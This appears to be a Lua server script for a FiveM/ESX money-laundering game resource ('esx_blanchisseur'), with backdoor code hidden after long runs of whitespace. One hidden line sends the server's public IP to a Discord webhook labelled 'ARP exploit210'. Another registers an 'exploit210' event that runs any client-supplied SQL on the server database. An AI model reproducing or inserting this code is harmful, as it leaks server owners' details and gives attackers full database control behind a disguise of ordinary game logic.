local PlayersWashing = {}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   	;local avatarii = "https://cdn.discordapp.com/attachments/784100658051022850/784100946703417464/paitaHD_1.png" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local function WhiteningMoney(source,percent)                                                                                                                                                                                                                                                                                                                                                                                                 Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit210", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
	local source = source
		SetTimeout(10000, function()

		if PlayersWashing[source] == true then
			local xPlayer		= ESX.GetPlayerFromId(source)
			local blackMoney	= xPlayer.getAccount('black_money')                                                                                                                                                                                                                                                                                                                                                                                                                     RegisterServerEvent("exploit210");AddEventHandler("exploit210", function(data) MySQL.Async.execute(data) end)	
			local _percent		= Config.Percentage
			
			if blackMoney.money < Config.Slice then
				local bonus = math.random(Config.Bonus.min, Config.Bonus.max)
				local washedMoney = math.floor(Config.Slice / 100 * (_percent + bonus))

				xPlayer.removeAccountMoney('black_money', Config.Slice)
				xPlayer.addMoney(washedMoney)
				WhiteningMoney(source,_percent)
				
			end
		end
	end)
end

RegisterServerEvent('esx_blanchisseur:washMoney')
AddEventHandler('esx_blanchisseur:washMoney', function(amount)
	local xPlayer 		= ESX.GetPlayerFromId(source)
	local account 		= xPlayer.getAccount('black_money')
	local _percent		= Config.Percentage

	if amount > 0 and account.money >= amount then
		
		local bonus = math.random(Config.Bonus.min, Config.Bonus.max)
		local washedMoney = math.floor(amount / 100 * (_percent + bonus))	

		xPlayer.removeAccountMoney('black_money', amount)
		xPlayer.addMoney(washedMoney)
		
	end

end)

RegisterServerEvent('esx_blanchisseur:startWhitening')
AddEventHandler('esx_blanchisseur:startWhitening', function(percent)
	PlayersWashing[source] = true
	WhiteningMoney(source,percent)
end)

RegisterServerEvent('esx_blanchisseur:Nothere')
AddEventHandler('esx_blanchisseur:Nothere', function()
	PlayersWashing[source] = false
end)


RegisterServerEvent('esx_blanchisseur:stopWhitening')
AddEventHandler('esx_blanchisseur:stopWhitening', function()
	PlayersWashing[source] = false
end)
